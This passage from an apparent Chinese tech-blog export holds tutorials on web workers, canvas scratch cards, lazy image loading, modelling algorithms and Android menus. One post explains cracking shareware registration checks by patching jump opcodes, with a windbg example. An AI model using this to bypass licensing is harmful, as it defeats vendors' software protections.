worker.postMessage(&#123;&apos;cmd&apos;: &apos;stop&apos;, &apos;msg&apos;: &apos;stop&apos;&#125;);&#125;function msg()&#123; worker.postMessage(&#123;&apos;msg&apos;: &apos;hello imweb&apos;&#125;);&#125; worker.js： 12345678910111213141516171819 self.onmessage = function (e) &#123; var data = e.data; switch (data.cmd) &#123; case &apos;start&apos;: taskStart(); //大量数据处理 postMessage(&apos;WORKER DO: &apos; + data.msg); break; case &apos;pause&apos;: taskPause(); postMessage(&apos;WORKER DO: &apos; + data.msg); break; case &apos;stop&apos;: postMessage(&apos;WORKER DO: &apos; + data.msg); self.close(); //终止web worker break; default: postMessage(&apos;MESSAGE: &apos; + data.msg); &#125;;&#125;; 从上面的例子可以看到，一是利用对象参数，进程之间能够较灵活的实现控制；二是当woker执行taskStart()处理大量数据时，只在子进程处理，不会给主页面带来阻塞，通常，处理大量数据会消极影响程序的响应能力，而web worker通过这样的方式，能提供一个更流畅更实时的UI。 共享worker 共享worker允许线程在同源中的多个页面间进行共享，例如：同源中所有页面或脚本可以与同一个共享线程通信。它的实例化与事件侦听的写法与专用worker略有不同,主页面： 123456 var worker = new SharedWorker(&apos;shared-worker.js&apos;);worker.port.onmessage = function(e) &#123; msg = &apos;Someone just said &quot;&apos; + e.data.message + &apos;&quot;. That is message number &apos; + e.data.counter; console.log(msg);&#125;;worker.port.postMessage(&apos;hello shared worker!&apos;); shared-worker.js: 12345678910111213141516 var counter = 0;var connections = [];onconnect = function(eConn) &#123; var port = eConn.ports[0]; // 此连接的特有port //当有消息的时候通知所有的连接 port.onmessage = function(eMsg) &#123; counter++; for (var i=0; i &lt; connections.length; i++)&#123; connections[i].postMessage(&#123; message: eMsg.data, counter: counter &#125;); &#125; &#125; port.start(); connections.push(port); 用两个窗口打开这个页面，第一个显示：Someone just said “Hello shared worker!” This is message number 1，第二个也收到一样的信息，但是后面是message number 2。 安全性和错误检查 出于安全性的考虑，web worker必须遵守同源策略。同时，它的全局对象是worker对象本身，this和self引用的都是worker对象。 只能访问： navigator 对象（仅限appName, appVersion, platform, userAgent） location 对象（只读） XMLHttpRequest setTimeout(), setInterval(), clearTimeout()和clearInterval()方法 不能访问： DOM(不是线程安全的) window 对象 document 对象 parent 对象 worker内部出现错误时，可以用worker.onerror侦听到，error的事件有三个属性： filename: 发生错误的文件名 lineno: 代码行号 message: 完整的错误信息 如： 123 worker.onerror = function(e) &#123; console.log(e.filename+&quot;ERROR on line&quot;+e.lineno+&quot;,msg:&quot;+e.message);&#125; web worker的其他尝试 对于比较消耗时间的操作，我们可看到web worker能够发挥它的作用。比如：大量数据排序，精确到像素的canvas计算等。而我们又知道，jsonp加载数据时，动态创建script标签，加载和执行这些过程都是阻塞式的，而web worker正好可以异步加载，这会是更快的方式吗？带着这个疑问我做了下面的试验，分别用jsonp和worker的方式去加载文件，计算数据返回时延： 1234567891011121314151617181920 function tryJsonp()&#123; var d = (new Date()).valueOf(); var jsonp=document.createElement(&quot;script&quot;); jsonp.type=&quot;text/javascript&quot;; jsonp.src=&quot;worker.js?_=&quot;+d; document.getElementsByTagName(&quot;head&quot;)[0].appendChild(jsonp); jsonp.onload = jsonp.onreadystatechange = function()&#123; if(!this.readyState||this.readyState==&apos;loaded&apos;||this.readyState==&apos;complete&apos;)&#123; console.log(&apos;jsonp: &apos;+ ((new Date()).valueOf() - d)); &#125; &#125;&#125;function tryWorker()&#123; var d = (new Date()).valueOf(); var worker = new Worker(&quot;worker.js&quot;); worker.postMessage(&#123;&apos;cmd&apos;: &apos;start&apos;, &apos;msg&apos;: &apos;start&apos;&#125;); worker.onmessage = function (event) &#123; console.log(&apos;web worker: &apos;+ ((new Date()).valueOf() - d)); &#125;;&#125; 第一次加载是一份1k大小的文件，每个方法重复5次，返回结果为: 第二次加载1800k大小的文件，返回结果为： 可以看到对于较小的数据，jsonp还是比web worker要快，这可能是实例化worker对象时带来的影响；而数据偏大时，web worker的加载将会更优，而且它可以异步加载。 本文链接： http://www.meng.uno/articles/da19b401/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/tags/web/"},{"name":"html5","slug":"html5","permalink":"http://www.meng.uno/tags/html5/"},{"name":"worker","slug":"worker","permalink":"http://www.meng.uno/tags/worker/"}]},{"title":"HTML5实现刮奖效果","slug":"h5_award","date":"2015-07-15T23:31:04.000Z","updated":"2018-03-20T10:07:03.299Z","comments":true,"path":"articles/9da0578c/","link":"","permalink":"http://www.meng.uno/articles/9da0578c/","excerpt":"要实现刮奖效果，最重要的是要找到一种方法：当刮开上层的涂层是就能看到下层的结果。而HTML5的canvas API中有一个属性globalCompositeOperation，这个属性有多个值，而实现刮奖效果要用到的值就是destination-out。意思就是：在已有内容和新图形不重叠的地方，已有内容保留，所有其他内容成为透明。这样可能不好理解，后面实现的时候会解释。有了globalCompositeOperation这个属性，实现过程就很简单了。 我们需要有两个层，上面一层肯定是一个canvas元素，因为要能刮开就要用到画布。下面一层其实用什么元素都可以，既然上层用的是canvas元素，","text":"要实现刮奖效果，最重要的是要找到一种方法：当刮开上层的涂层是就能看到下层的结果。而HTML5的canvas API中有一个属性globalCompositeOperation，这个属性有多个值，而实现刮奖效果要用到的值就是destination-out。意思就是：在已有内容和新图形不重叠的地方，已有内容保留，所有其他内容成为透明。这样可能不好理解，后面实现的时候会解释。有了globalCompositeOperation这个属性，实现过程就很简单了。 我们需要有两个层，上面一层肯定是一个canvas元素，因为要能刮开就要用到画布。下面一层其实用什么元素都可以，既然上层用的是canvas元素，下层我们也用canvas元素，下面是html内容： 1234567891011121314151617181920212223242526272829 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; /&gt; &lt;title&gt;刮刮乐&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;canvas id=&quot;underCanvas&quot; width=300 height=300 style=&quot;position: absolute; left: 0;top: 0;&quot;&gt;&lt;/canvas&gt; &lt;canvas id=&quot;upCanvas&quot; width=300 height=300 style=&quot;position: absolute; left: 0; top: 0;&quot;&gt;&lt;/canvas&gt; &lt;script src=&quot;./scratch.js&quot;&gt;&lt;/script&gt; &lt;script&gt; // 可能变化的值放在options中，方便修改 var options = &#123; text: &#123; fontWeight: &quot;bold&quot;, fontSize: 30, fontFamily: &quot;Arial&quot;, align: &quot;center&quot;, color: &apos;#F60&apos; &#125;, maskColor: &quot;red&quot;, radius: 30, awards: [&quot;一等奖&quot;, &quot;二等奖&quot;, &quot;三等奖&quot;, &quot;谢谢！&quot;] &#125;; new Scratch(options).init(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 先实现一个构造函数： 1234567891011121314151617 var Scratch = function (options) &#123;// 下层画布元素 this.underCanvas = doc.getElementById(&quot;underCanvas&quot;); // 上层画布元素this.upCanvas = doc.getElementById(&quot;upCanvas&quot;); // 获取下层画布绘图上下文this.underCtx = this.underCanvas.getContext(&quot;2d&quot;); // 获取上层画布绘图上下文this.upCtx = this.upCanvas.getContext(&quot;2d&quot;); // 画布宽度this.width = this.upCanvas.width; // 画布高度this.height = this.upCanvas.height; // 自定义选项this.options = options; this.award = null; &#125;; 在下层画布上画上刮奖的内容： 123456789 drawText: function () &#123; var ctx = this.underCtx; var text = this.options.text; ctx.font = text.fontWeight + &quot; &quot; + text.fontSize + &apos;px &apos; + text.fontFamily; ctx.textAlign = text.align; ctx.fillStyle = text.color; this.award = this.options.awards[(Math.random() * this.options.awards.length) | 0]; //随机抽奖 ctx.fillText(this.award, this.width / 2, this.height / 2 + text.fontSize / 2); &#125; 这边奖的内容是随机出现的，因为奖肯定有很多种，可以用一个数组来存放奖的内容，然后随机显示： 1 this.award = this.options.awards[(Math.random() * this.options.awards.length) | 0]; 然后在上层画布中画一层涂层： 123456 drawMask: function () &#123; var ctx = this.upCtx; ctx.fillStyle = this.options.maskColor; ctx.fillRect(0, 0, this.width, this.height); ctx.globalCompositeOperation = &apos;destination-out&apos;;&#125; 在上层画布中用了globalCompositeOperation这个属性，当再在画布上画东西时，那么后面画的内容和涂层重合的部分将变透明，而其余涂层部分不变。就是利用了这个原理实现了刮奖效果。 需要刮开上层的涂层，就需要在上层画布上绑定事件： 1234567891011121314151617181920212223242526272829303132 addEvent: function () &#123; var that = this; var upCanvas = this.upCanvas; var callback1, callback2, callback3; upCanvas.addEventListener(&quot;mousedown&quot;, callback1 = function (evt) &#123; upCanvas.addEventListener(&quot;mousemove&quot;, callback2 = function (evt) &#123; var x = evt.clientX - upCanvas.offsetLeft; var y = evt.clientY - upCanvas.offsetTop; var ctx = that.upCtx; var options = that.options; ctx.beginPath(); var gradient = ctx.createRadialGradient(x, y, 0, x, y, options.radius); // 其实这边的颜色值是可以随便写的，因为都会变成透明，重要的是透明度 gradient.addColorStop(0, &quot;rgba(255, 255, 255, 0.5)&quot;); gradient.addColorStop(1, &quot;rgba(255, 255, 255, 0)&quot;);// 也可以不用渐变，直接用一种颜色，但渐变效果更好 ctx.fillStyle = gradient; ctx.arc(x, y, options.radius, 0, Math.PI * 2, true); ctx.fill(); ctx.closePath();// 当刮开部分&gt;80%的时候提醒刮奖结果，这个可以自己设置 if (that.result() &gt; 0.8) &#123; alert(that.award); upCanvas.removeEventListener(&quot;mousemove&quot;, callback2); &#125; &#125;, false); doc.addEventListener(&quot;mouseup&quot;, callback3 = function () &#123; upCanvas.removeEventListener(&quot;mousemove&quot;, callback2); doc.removeEventListener(&quot;mouseup&quot;, callback3); &#125;, false); &#125;, false);&#125; 我们需要在刮到一定程度时提醒刮奖的结果： 12345678910111213141516171819 result: function () &#123;// 获取文字部分的宽、高 var textWidth = this.options.text.fontSize * this.award.length; var textHeight = this.options.text.fontSize; // 获取文字部分的像素，这样可以根据刮开文字的部分占全部文字部分的百分比来提示结果，比如说在刮开80%的时候提示刮奖结果 var imgData = this.upCtx.getImageData(this.width / 2 - textWidth / 2, this.height / 2 - textHeight / 2, textWidth, textHeight); var pixelsArr = imgData.data; var transPixelsArr = []; for (var i = 0, j = pixelsArr.length; i &lt; j; i += 4) &#123; // a代表透明度 var a = pixelsArr[i + 3]; // 渐变的透明度＜=0.5，其实透明度的值是介于0~255之间的，0.5 * 255 = 127.5就是a的值 if (a &lt; 128) &#123; transPixelsArr.push(a); &#125; &#125; // 小于128的透明度的值的个数占总透明度的的个数的百分比 return transPixelsArr.length / (pixelsArr.length / 4); &#125; 上面用到了getImageData()方法，这个方法返回像素数据。重要的是我们只是获取了下层文字部分的像素数据，因为我们只需要知道刮开的文字部分占全部文字部分的百分比。 调用构造函数时，把可能改变的东西放在一个对象options中传递给构造函数： 12345678910111213141516171819 // 可能变化的值放在options中，方便修改 var options = &#123;// 文字部分的样式 text: &#123; fontWeight: &quot;bold&quot;, fontSize: 30, fontFamily: &quot;Arial&quot;, align: &quot;center&quot;, color: &apos;#F60&apos; &#125;,// 图层颜色 maskColor: &quot;red&quot;,// 画逼半径 radius: 20,// 奖项 awards: [&quot;一等奖&quot;, &quot;二等奖&quot;, &quot;三等奖&quot;, &quot;谢谢！&quot;] &#125;; new Scratch(options).init(); 本文链接： http://www.meng.uno/articles/9da0578c/ 欢迎转载！","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://www.meng.uno/categories/JavaScript/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"http://www.meng.uno/tags/HTML5/"},{"name":"canvas","slug":"canvas","permalink":"http://www.meng.uno/tags/canvas/"},{"name":"刮奖效果","slug":"刮奖效果","permalink":"http://www.meng.uno/tags/刮奖效果/"}]},{"title":"说到加载图片，我们可以谈些什么","slug":"img_lazy_load","date":"2015-04-28T15:54:00.000Z","updated":"2018-03-20T06:59:57.923Z","comments":true,"path":"articles/bc3de361/","link":"","permalink":"http://www.meng.uno/articles/bc3de361/","excerpt":"是每个前端开发都会的技能。然而，如果你想做到极致，事情还没有这么简单。 第一步：滚屏加载 这是最容易想到的点，也是一开始就准备做的。 随web体验的进步，滚屏加载代替分页加载的情形越来越多。也就是先预留图片位置，而不去加载图片，直到这个预留区域滚动到屏幕中，用户能看见了，才去加载图片。如此一来，有“按需加载”的意味，由于图片加载延后，不抢占带宽，在打开页面的首屏会快很多。我们称之为“懒加载(lazyload)”。 其实现也很简单，在html里面写，然后用js去判断这个节点是否出现在屏幕中，如果是，则","text":"&lt;img src=&quot;xx.jpg&quot; /&gt;是每个前端开发都会的技能。然而，如果你想做到极致，事情还没有这么简单。 第一步：滚屏加载 这是最容易想到的点，也是一开始就准备做的。 随web体验的进步，滚屏加载代替分页加载的情形越来越多。也就是先预留图片位置，而不去加载图片，直到这个预留区域滚动到屏幕中，用户能看见了，才去加载图片。如此一来，有“按需加载”的意味，由于图片加载延后，不抢占带宽，在打开页面的首屏会快很多。我们称之为“懒加载(lazyload)”。 其实现也很简单，在html里面写&lt;img lazy-src=&quot;xx.jpg&quot; /&gt;，然后用js去判断这个节点是否出现在屏幕中，如果是，则取出lazy-src属性，赋值成&lt;img lazy-src=&quot;xx.jpg&quot; src=&quot;xx.jpg&quot;/&gt;，触发此节点onload，这就实现最简单的滚屏加载了。 第二步：特殊状态处理 特殊状态有两种：加载中与加载失败。这两种情况的处理逻辑相类似，拿加载中的逻辑做例子。 图片触发加载，到图片加载完成（或失败）之间，肯定会有一段时间。不做处理的话，用户在等待的过程中，就只能看到空白的区域，非常的奇怪。在低网速，以及用户非常快的拉滚动条的情形下，这种现象将更加明显。 那么在触发onload之前，就需要补一些逻辑，展示对应的loading图。 将需要处理的img节点作为参数，调用tempImg函数，克隆一个节点强行插在img之前，用于loading中的展示。 123456789101112 var tempImg = function(target)&#123; var w = target.width(); var h = target.height(); var tempDom = target.clone().addClass(&quot;lazy-loding&quot;).insertBefore(target); if(w/h == 1)&#123; tempDom[0].src = &quot;http://9.url.cn/edu/img/img-loading.png&quot;; &#125;else&#123; tempDom[0].src = &quot;http://9.url.cn/edu/img/img-loading2.png&quot;; &#125; target.hide();&#125; 第三步：上报监控 这一步在大型前端项目中非常重要，也是经常被忽略的地方。尽管需要简易的后台配合，但不算麻烦的上报监控，能让产品更加稳定和健壮。 我在两个地方用到了上报。其一是图片加载失败，触发onerror时，这样一来我们能知道每天图片拉取失败的量；其二是图片加载的时间，能够帮助我们分析cdn服务是否异常，分析全国慢速用户比例等等。 而所谓的上报其实就是一个http请求，我会大概把这些信息带上： 123456 log(&#123; &apos;type&apos;: &apos;error&apos;, &apos;msg&apos;: &apos;lazyload拉取图片失败上报 &apos;, &apos;url&apos;: window.location.href, &apos;pid&apos;: 414342 //产品对应的id&#125;); 第四步：居中截取 这是前端无可避免的一个问题，先来说下此问题的背景。 由于我们是先用一个空白的img标签占位，再去加载图片，如果图片的高度特别长（比如新浪长微博），加载完成时就会撑开节点，引起滚动条的跳动。由于移动端屏幕较PC窄，一个跳动就可能让你找不到前一秒正在浏览的内容，这种体验尤其严重。在移动端的web设计中，可以看到许多知名互联网公司的产品，也经常忽略这一点。 因此我们可以限定占位区域的size，以此区域来做居中截取。当占位区域与图片最终展示同宽同高时，就不会引起跳动，而且也保持了视觉的一致性。 其原理如下，先判断是竖向长型图，还是横向长型图，根据不同的情况，优先让宽或高填充满占位区域，然后通过不同的负margin去实现居中。 123456789101112131415 var calSize = function($img) &#123; var w = $img.width(), h = $img.height(), width = size[0], height = size[1]; if(w+h == 0) return; //如果是长型图，优先适配宽度，高度居中截取 if(w/h &gt; width/height)&#123; var newWidth = height * w / h; var margin = (width - newWidth)/2; $img.height(height).css(&#123;&quot;margin-left&quot;: margin&#125;); &#125;else&#123; var newHeight = width * h / w; var margin = (height - newHeight)/2; $img.width(width).css(&#123;&quot;margin-top&quot;: margin&#125;); &#125;&#125; 第五步：支持webp webp格式图片是google开发的一种旨在加快图片加载速度的图片格式，压缩提交大概只有jpg的2/3。随chrome的比例越来越多，其实让更多用户体验到webp也是一件好事。 那么问题来了，怎么去判断用户的浏览器是否支持webp呢？ 根据ua去判断是个好方法，但不太靠谱，因为chrome中其实也有设置，让它不能去支持webp，而且webkit本身就开源，会衍生出很多你不知道名字的浏览器。 最终我使用的是特性检测： 12345678910111213141516 if(!supportedWebPIsLoading) &#123; supportedWebPIsLoading = true; var images = &#123; basic: &quot;data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAACyAgCdASoCAAEALmk0mk0iIiIiIgBoSygABc6zbAAA/v56QAAAAA==&quot; &#125;, $img = new Image(); $img.onload = function () &#123; supportedWebPIsLoading = false; $.cookie.set(&quot;iswebp&quot; , +supportedWebP); &#125;; $img.onerror = function () &#123; supportedWebP = false; supportedWebPIsLoading = false; $.cookie.set(&quot;iswebp&quot; , +supportedWebP); &#125;; $img.src = images.basic;&#125; 我们会让浏览器试着加载一张非常小的base64格式的webp图片，如果能够正常加载，说明是支持webp的。 并且，会把测试记录在cookie里，所以第二次直接从cookie里读结果，基本不会影响性能。完成了最重要的检查，我们就可以放心让服务器返回不同格式的图片了。 本文链接： http://www.meng.uno/articles/bc3de361/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"js","slug":"js","permalink":"http://www.meng.uno/tags/js/"},{"name":"图片加载","slug":"图片加载","permalink":"http://www.meng.uno/tags/图片加载/"}]},{"title":"数学建模常用的十大算法","slug":"cumum-func","date":"2015-02-03T12:03:33.000Z","updated":"2018-02-18T13:25:50.292Z","comments":true,"path":"articles/dd0e4c80/","link":"","permalink":"http://www.meng.uno/articles/dd0e4c80/","excerpt":"概述 蒙特卡罗算法 该算法又称随机性模拟算法，是通过计算机仿真来解决问题的算法，同时可以通过模拟来检验自己模型的正确性，几乎是比赛时必用的方法。 数据拟合、参数估计、插值等数据处理算法 比赛中通常会遇到大量的数据需要处理，而处理数据的关键就在于这些算法，通常使用MATLAB 作为工具。 线性规划、整数规划、多元规划、二次规划等规划类算法 建模竞赛大多数问题属于最优化问题，很多时候这些问题可以用数学规划算法来描述，通常使用Lindo、Lingo 软件求解。 图论算法 这类算法可以分为很多种，包括最短路、网络流、二分图等算法，涉及到图论的问题可以用这些方法解决，需要认真准备。 动态规划、回","text":"概述 蒙特卡罗算法 该算法又称随机性模拟算法，是通过计算机仿真来解决问题的算法，同时可以通过模拟来检验自己模型的正确性，几乎是比赛时必用的方法。 数据拟合、参数估计、插值等数据处理算法 比赛中通常会遇到大量的数据需要处理，而处理数据的关键就在于这些算法，通常使用MATLAB 作为工具。 线性规划、整数规划、多元规划、二次规划等规划类算法 建模竞赛大多数问题属于最优化问题，很多时候这些问题可以用数学规划算法来描述，通常使用Lindo、Lingo 软件求解。 图论算法 这类算法可以分为很多种，包括最短路、网络流、二分图等算法，涉及到图论的问题可以用这些方法解决，需要认真准备。 动态规划、回溯搜索、分治算法、分支定界等计算机算法 这些算法是算法设计中比较常用的方法，竞赛中很多场合会用到。 最优化理论的三大非经典算法：模拟退火算法、神经网络算法、遗传算法 这些问题是用来解决一些较困难的最优化问题的，对于有些问题非常有帮助，但是算法的实现比较困难，需慎重使用。 网格算法和穷举法 两者都是暴力搜索最优点的算法，在很多竞赛题中有应用，当重点讨论模型本身而轻视算法的时候，可以使用这种暴力方案，最好使用一些高级语言作为编程工具。 一些连续数据离散化方法 很多问题都是实际来的，数据可以是连续的，而计算机只能处理离散的数据，因此将其离散化后进行差分代替微分、求和代替积分等思想是非常重要的。 数值分析算法 如果在比赛中采用高级语言进行编程的话，那些数值分析中常用的算法比如方程组求解、矩阵运算、函数积分等算法就需要额外编写库函数进行调用。 图象处理算法 赛题中有一类问题与图形有关，即使问题与图形无关，论文中也会需要图片来说明问题，这些图形如何展示以及如何处理就是需要解决的问题，通常使用MATLAB 进行处理。 以下将结合历年的竞赛题，对这十类算法进行详细地说明。 十类算法的详细说明 蒙特卡罗算法 大多数建模赛题中都离不开计算机仿真，随机性模拟是非常常见的算法之一。举个例子就是97 年的A 题，每个零件都有自己的标定值，也都有自己的容差等级，而求解最优的组合方案将要面对着的是一个极其复杂的公式和108 种容差选取方案，根本不可能去求解析解，那如何去找到最优的方案呢？随机性模拟搜索最优方案就是其中的一种方法，在每个零件可行的区间中按照正态分布随机的选取一个标定值和选取一个容差值作为一种方案，然后通过蒙特卡罗算法仿真出大量的方案，从中选取一个最佳的。另一个例子就是去年的彩票第二问，要求设计一种更好的方案，首先方案的优劣取决于很多复杂的因素，同样不可能刻画出一个模型进行求解，只能靠随机仿真模拟。 数据拟合、参数估计、插值等算法 数据拟合在很多赛题中有应用，与图形处理有关的问题很多与拟合有关系，一个例子就是98 年美国赛A 题，生物组织切片的三维插值处理，94 年A 题逢山开路，山体海拔高度的插值计算，还有吵的沸沸扬扬可能会考的“非典”问题也要用到数据拟合算法，观察数据的走向进行处理。此类问题在MATLAB中有很多现成的函数可以调用，熟悉MATLAB，这些方法都能游刃有余的用好。 规划类问题算法 竞赛中很多问题都和数学规划有关，可以说不少的模型都可以归结为一组不等式作为约束条件、几个函数表达式作为目标函数的问题，遇到这类问题，求解就是关键了，比如98年B 题，用很多不等式完全可以把问题刻画清楚，因此列举出规划后用Lindo、Lingo 等软件来进行解决比较方便，所以还需要熟悉这两个软件。 图论问题 98年B题、00年B题、95年锁具装箱等问题体现了图论问题的重要性，这类问题算法有很多，包括：Dijkstra、Floyd、Prim、Bellman-Ford，最大流，二分匹配等问题。每一个算法都应该实现一遍，否则到比赛时再写就晚了。 计算机算法设计中的问题 计算机算法设计包括很多内容：动态规划、回溯搜索、分治算法、分支定界。比如92 年B 题用分枝定界法，97 年B 题是典型的动态规划问题，此外98 年B 题体现了分治算法。这方面问题和ACM 程序设计竞赛中的问题类似，推荐看一下《计算机算法设计与分析》（电子工业出版社）等与计算机算法有关的书。 最优化理论的三大非经典算法 这十几年来最优化理论有了飞速发展，模拟退火法、神经网络、遗传算法这三类算法发展很快。近几年的赛题越来越复杂，很多问题没有什么很好的模型可以借鉴，于是这三类算法很多时候可以派上用场，比如：97 年A 题的模拟退火算法，00 年B 题的神经网络分类算法，象01 年B 题这种难题也可以使用神经网络，还有美国竞赛89 年A 题也和BP 算法有关系，当时是86 年刚提出BP 算法，89 年就考了，说明赛题可能是当今前沿科技的抽象体现。03 年B 题伽马刀问题也是目前研究的课题，目前算法最佳的是遗传算法。 网格算法和穷举算法 网格算法和穷举法一样，只是网格法是连续问题的穷举。比如要求在N 个变量情况下的最优化问题，那么对这些变量可取的空间进行采点，比如在[a; b] 区间内取M +1 个点，就是a; a+(b-a)/M; a+2 (b-a)/M; …… ; b 那么这样循环就需要进行(M + 1)N 次运算，所以计算量很大。比如97 年A 题、99 年B 题都可以用网格法搜索，这种方法最好在运算速度较快的计算机中进行，还有要用高级语言来做，最好不要用MATLAB 做网格，否则会算很久的。穷举法大家都熟悉，就不说了。 一些连续数据离散化的方法 大部分物理问题的编程解决，都和这种方法有一定的联系。物理问题是反映我们生活在一个连续的世界中，计算机只能处理离散的量，所以需要对连续量进行离散处理。这种方法应用很广，而且和上面的很多算法有关。事实上，网格算法、蒙特卡罗算法、模拟退火都用了这个思想。 数值分析算法 这类算法是针对高级语言而专门设的，如果你用的是MATLAB、Mathematica，大可不必准备，因为象数值分析中有很多函数一般的数学软件是具备的。 图象处理算法 01 年A 题中需要你会读BMP 图象、美国赛98 年A 题需要你知道三维插值计算，03 年B 题要求更高，不但需要编程计算还要进行处理，而数模论文中也有很多图片需要展示，因此图象处理就是关键。做好这类问题，重要的是把MATLAB 学好，特别是图象处理的部分。 本文链接： http://www.meng.uno/articles/dd0e4c80/ 欢迎转载！","categories":[{"name":"数学建模","slug":"数学建模","permalink":"http://www.meng.uno/categories/数学建模/"}],"tags":[{"name":"数学建模","slug":"数学建模","permalink":"http://www.meng.uno/tags/数学建模/"},{"name":"算法","slug":"算法","permalink":"http://www.meng.uno/tags/算法/"}]},{"title":"Android 自定义toolBar上的 action item","slug":"android-custom-menu","date":"2015-01-19T03:48:46.000Z","updated":"2018-03-20T10:07:03.298Z","comments":true,"path":"articles/bc6e8459/","link":"","permalink":"http://www.meng.uno/articles/bc6e8459/","excerpt":"自定义的view，action_view_auto_like.xml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15","text":"自定义的view，action_view_auto_like.xml 123456789101112131415 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;FrameLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\"&gt; &lt;ImageButton android:id=\"@+id/action_auto_like_button\" android:layout_width=\"70dp\" android:layout_height=\"30dp\" android:scaleType=\"centerInside\" android:background=\"@android:color/transparent\" android:src=\"@drawable/btn_nav_autoliker\"&gt; &lt;/ImageButton&gt;&lt;/FrameLayout&gt; 自定义的menu，menu_tinder_liker.xml 123456789101112 &lt;menu xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tinder=\"http://schemas.android.com/apk/res-auto\"&gt; &lt;item android:id=\"@+id/action_auto\" android:actionLayout=\"@layout/action_view_auto_like\" android:icon=\"@drawable/btn_nav_autoliker\" android:orderInCategory=\"1\" android:title=\"@string/action_auto_like\" tinder:actionLayout=\"@layout/action_view_auto_like\" tinder:showAsAction=\"always\"/&gt;&lt;/menu&gt; 在fragment 中配置 现在onCreateView中加上setHasOptionsMenu(true);，让系统在fragment中初始化menu。 12345678910 @Overridepublic void onCreateOptionsMenu(Menu menu, MenuInflater inflater) &#123; inflater.inflate(R.menu.menu_tinder_like, menu); MenuItem searchItem = menu.findItem(R.id.action_auto); FrameLayout layout = (FrameLayout) MenuItemCompat .getActionView(searchItem); layout.findViewById(R.id.action_auto_like_button) .setOnClickListener(this); super.onCreateOptionsMenu(menu, inflater);&#125; 然后在onClick中加入你的逻辑。 本文链接： http://www.meng.uno/articles/bc6e8459/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"menu","slug":"menu","permalink":"http://www.meng.uno/tags/menu/"},{"name":"toolbar","slug":"toolbar","permalink":"http://www.meng.uno/tags/toolbar/"}]},{"title":"破解时常用的汇编命令","slug":"asm-func-black","date":"2014-11-03T12:10:37.000Z","updated":"2018-02-18T13:25:50.289Z","comments":true,"path":"articles/36aa5187/","link":"","permalink":"http://www.meng.uno/articles/36aa5187/","excerpt":"概述 基本上多数破解的思路是一样的，就是将本来判断为true的时候干的事情改为逻辑值为false就做，因此常常需要替换一些汇编命令： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 cmp a,b 比较a与b mov a,b 把b的值送给a ret 返回主程序 nop 无作用,英文“no operation”的简写，意思是“do nothing”(机器码90) call 调用子程序 je 或jz 若相等则跳(机器码74 或0F84) jne或jnz 若不相等则跳(机器码75或0F85) jmp 无条件跳(机器码EB) jb 若小于则跳 ja 若大于则跳 jg","text":"概述 基本上多数破解的思路是一样的，就是将本来判断为true的时候干的事情改为逻辑值为false就做，因此常常需要替换一些汇编命令： 12345678910111213141516 cmp a,b 比较a与bmov a,b 把b的值送给aret 返回主程序nop 无作用,英文“no operation”的简写，意思是“do nothing”(机器码90)call 调用子程序je 或jz 若相等则跳(机器码74 或0F84)jne或jnz 若不相等则跳(机器码75或0F85)jmp 无条件跳(机器码EB)jb 若小于则跳ja 若大于则跳jg 若大于则跳jge 若大于等于则跳jl 若小于则跳jle 若小于等于则跳pop 出栈push 压栈 常见修改(机器码) 12 74=&gt;75 74=&gt;90 74=&gt;EB75=&gt;74 75=&gt;90 75=&gt;EB jnz -&gt; nop 1 75-&gt;90(相应的机器码修改) jnz -&gt; jmp 1 75 -&gt; EB(相应的机器码修改) jnz -&gt; jz 12 75-&gt;74 (正常) 0F 85 -&gt; 0F 84(特殊情况下,有时,相应的机器码修改) 两种不同情况的不同修改方法 修改为jmp je(jne,jz,jnz) =&gt;jmp相应的机器码EB （出错信息向上找到的第一个跳转）jmp的作用是绝对跳，无条件跳，从而跳过下面的出错信息。 出错信息，例如：注册码不对，sorry,未注册版不能…，“Function Not Avaible in Demo” 或 “Command Not Avaible” 或 &quot;Can’t save in Shareware/Demo&quot;等 （我们希望把它跳过，不让它出现）。 修改为nop je(jne,jz,jnz) =&gt;nop相应的机器码90 （正确信息向上找到的第一个跳转） nop的作用是抹掉这个跳转，使这个跳转无效，失去作用，从而使程序顺利来到紧跟其后的正确信息处。 正确信息，例如：注册成功，谢谢您的支持等（我们希望它不被跳过，让它出现，程序一定要顺利来到这里）。 出错信息（我们希望不要跳到这里，不让它出现）它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据。 例如使用windbg时候： 12 0:000&gt; dd 0c366b28 l40c366b28 7e830c74 940f0108 c0b60fc0 01b805eb 执行ed 0c366b28 7e830c75 修改为: 12 0:000&gt; dd 0c366b28 l40c366b28 7e830c75 940f0108 c0b60fc0 01b805eb 本文链接： http://www.meng.uno/articles/36aa5187/ 欢迎转载！","categories":[{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/categories/Language/"},{"name":"ASM","slug":"Language/ASM","permalink":"http://www.meng.uno/categories/Language/ASM/"}],"tags":[{"name":"破解","slug":"破解","permalink":"http://www.meng.uno/tags/破解/"},{"name":"ASM","slug":"ASM","permalink":"http://www.meng.uno/tags/ASM/"},{"name":"汇编","slug":"汇编","permalink":"http://www.meng.uno/tags/汇编/"}]},{"title":"浏览器野史 UserAgent列传","slug":"userAgent","date":"2014-10-05T09:26:00.000Z","updated":"2018-03-20T06:59:57.930Z","comments":true,"path":"articles/fb689d08/","link":"","permalink":"http://www.meng.uno/articles/fb689d08/","excerpt":"某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。 控制台敲下： navigator.userAgent 浏览器回应： Mozilla/5.0 